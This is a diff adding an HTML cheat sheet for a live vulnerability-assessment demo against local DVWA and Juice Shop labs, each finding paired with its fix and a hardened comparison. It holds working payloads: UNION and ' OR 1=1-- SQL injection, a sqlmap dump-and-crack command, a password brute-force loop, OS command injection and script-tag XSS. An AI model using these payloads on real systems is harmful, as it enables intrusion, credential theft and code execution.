@@ -1,0 +1,108 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Demo Cheat Sheet</title>
+<style>
+  @page { size: Letter portrait; margin: 10mm; }
+  :root{ --navy:#0f2b46; --red:#c0241f; --green:#16834f; --amber:#9a5a04; --ink:#1c2430; --grey:#5b6675; --line:#d7dde5; --code:#f3f5f8; }
+  *{ box-sizing:border-box; }
+  html,body{ margin:0; padding:0; }
+  body{ font-family:-apple-system,"Segoe UI",Roboto,Arial,sans-serif; color:var(--ink); font-size:9.1px; line-height:1.3; background:#fff; }
+  .wrap{ padding:4px 6px; }
+  header{ display:flex; align-items:baseline; justify-content:space-between; border-bottom:2px solid var(--navy); padding-bottom:3px; margin-bottom:6px; }
+  header h1{ font-size:14px; margin:0; color:var(--navy); }
+  header .m{ font-size:8px; color:var(--grey); }
+  .setup{ background:var(--navy); color:#fff; border-radius:4px; padding:5px 7px; margin-bottom:7px; }
+  .setup b{ color:#cadcfc; }
+  code,.cmd{ font-family:"SF Mono",Consolas,Menlo,monospace; }
+  .setup code{ color:#dbeafe; }
+  .grid{ column-count:2; column-gap:9px; }
+  .f{ break-inside:avoid; border:1px solid var(--line); border-radius:4px; padding:5px 6px 6px; margin:0 0 6px; }
+  .f h2{ font-size:9.6px; margin:0 0 3px; color:var(--navy); display:flex; justify-content:space-between; align-items:center; }
+  .sev{ font-size:7.6px; font-weight:700; color:#fff; padding:1px 5px; border-radius:8px; }
+  .r{background:var(--red);} .a{background:var(--amber);}
+  .lbl{ font-weight:700; color:var(--grey); font-size:7.6px; text-transform:uppercase; letter-spacing:.4px; display:block; margin:3px 0 1px; }
+  .cmd{ background:var(--code); border:1px solid var(--line); border-left:2px solid var(--navy); border-radius:3px; padding:3px 5px; font-size:7.8px; white-space:pre-wrap; word-break:break-word; margin:1px 0; }
+  .exp{ color:var(--green); font-weight:600; }
+  .fix{ color:var(--green); }
+  .mini{ color:var(--grey); font-size:8px; }
+  footer{ margin-top:4px; border-top:1px solid var(--line); padding-top:3px; font-size:7.8px; color:var(--grey); display:flex; justify-content:space-between; }
+  @media screen{ body{ background:#e9edf2; } .wrap{ max-width:816px; margin:14px auto; background:#fff; box-shadow:0 2px 14px rgba(0,0,0,.15); } .hint{ max-width:816px; margin:8px auto 0; font:12px -apple-system,Arial; color:#444; } }
+  @media print{ .hint{ display:none; } }
+</style>
+</head>
+<body>
+<div class="hint">Print this: <b>Cmd+P → Save as PDF</b> (or print). Designed to fit one Letter page.</div>
+<div class="wrap">
+  <header>
+    <h1>Vulnerability Assessment — Live Demo Cheat Sheet</h1>
+    <span class="m">DVWA :4280 · Juice Shop :3000 · Hardened :4281 · admin/password</span>
+  </header>
+
+  <div class="setup">
+    <b>SETUP</b> &nbsp; <code>cd ~/Downloads/Claude/vuln-assessment &amp;&amp; bash scripts/setup_lab.sh</code><br>
+    <b>COOKIE</b> <code>export CK="PHPSESSID=$(grep -i PHPSESSID /tmp/dvwa_cookies.txt|awk '{print $NF}'); security=low"</code> &nbsp;·&nbsp; browser: DVWA → login → <b>Security=Low</b>
+  </div>
+
+  <div class="grid">
+
+    <div class="f">
+      <h2>1 · SQL Injection (DVWA)<span class="sev r">8.8 HIGH</span></h2>
+      <span class="lbl">Browser — SQL Injection box</span>
+      <div class="cmd">1' UNION SELECT user, password FROM users-- -</div>
+      <span class="lbl">Terminal — dump + crack</span>
+      <div class="cmd">python3 /tmp/sqlmap-dev/sqlmap.py -u "http://127.0.0.1:4280/vulnerabilities/sqli/?id=1&amp;Submit=Submit" --cookie="$CK" --batch -D dvwa -T users --dump</div>
+      <div class="mini"><span class="exp">→</span> all 5 users, MD5 cracked. <span class="fix">Fix:</span> Security=Impossible → prepared stmt, re-test = no data.</div>
+    </div>
+
+    <div class="f">
+      <h2>2 · SQLi Auth Bypass (Juice Shop)<span class="sev r">9.8 CRIT</span></h2>
+      <span class="lbl">Browser — login form</span>
+      <div class="cmd">email:  ' OR 1=1--     password: anything</div>
+      <span class="lbl">Terminal</span>
+      <div class="cmd">curl -s -H "Content-Type: application/json" --data '{"email":"'"'"' OR 1=1--","password":"x"}' http://127.0.0.1:3000/rest/user/login</div>
+      <div class="mini"><span class="exp">→</span> admin@juice-sh.op, JWT returned ("Login Admin" banner). <span class="fix">Fix:</span> parameterised query (code).</div>
+    </div>
+
+    <div class="f">
+      <h2>3 · Broken Auth / No Lockout<span class="sev r">8.1 HIGH</span></h2>
+      <span class="lbl">Terminal — brute + no-lockout</span>
+      <div class="cmd">SID=$(grep -i PHPSESSID /tmp/dvwa_cookies.txt|awk '{print $NF}')
+for p in 123456 admin letmein qwerty password; do curl -s -b "PHPSESSID=$SID; security=low" "http://127.0.0.1:4280/vulnerabilities/brute/?username=admin&amp;password=$p&amp;Login=Login" | grep -q Welcome &amp;&amp; echo "[+] $p" || echo "[-] $p"; done</div>
+      <div class="mini"><span class="exp">→</span> [+] password. <span class="fix">Fix:</span> Impossible = lockout 3 fails/15s + MFA.</div>
+    </div>
+
+    <div class="f">
+      <h2>4 · OS Command Injection<span class="sev r">8.8 HIGH</span></h2>
+      <span class="lbl">Browser — Command Injection IP box</span>
+      <div class="cmd">127.0.0.1; id; uname -a</div>
+      <div class="mini"><span class="exp">→</span> uid=33(www-data) + kernel = RCE. <span class="fix">Fix:</span> Impossible → "Invalid IP" (octet allow-list).</div>
+    </div>
+
+    <div class="f">
+      <h2>5 · XSS — Reflected + Stored<span class="sev a">6.1 MED</span></h2>
+      <span class="lbl">Browser — XSS (Reflected) name box</span>
+      <div class="cmd">&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
+      <span class="lbl">Browser — XSS (Stored) message box</span>
+      <div class="cmd">&lt;script&gt;alert('stored')&lt;/script&gt;</div>
+      <div class="mini"><span class="exp">→</span> script runs. <span class="fix">Fix:</span> Impossible → shows as text (htmlspecialchars) + CSP.</div>
+    </div>
+
+    <div class="f">
+      <h2>6 · Security Misconfiguration<span class="sev a">5.3 MED</span></h2>
+      <span class="lbl">Terminal — before (4280) vs after (4281)</span>
+      <div class="cmd">curl -s -D - -o /dev/null http://127.0.0.1:4280/login.php | grep -iE "server:|set-cookie|content-security|x-frame"
+curl -s -D - -o /dev/null http://127.0.0.1:4281/login.php | grep -iE "server:|set-cookie|content-security|x-frame|strict-transport"</div>
+      <div class="mini"><span class="exp">→</span> before: Apache leaked, no headers. after: nginx + CSP + X-Frame DENY + HSTS + HttpOnly cookie.</div>
+    </div>
+
+  </div>
+
+  <footer>
+    <span>Reset stored XSS: Setup / Reset DB → re-run setup_lab.sh. Flip back to Low before re-demoing.</span>
+    <span>Teardown: <code>docker compose -f docker-compose.yml -f docker-compose.hardened.yml down -v</code></span>
+  </footer>
+</div>
+</body>
+</html>
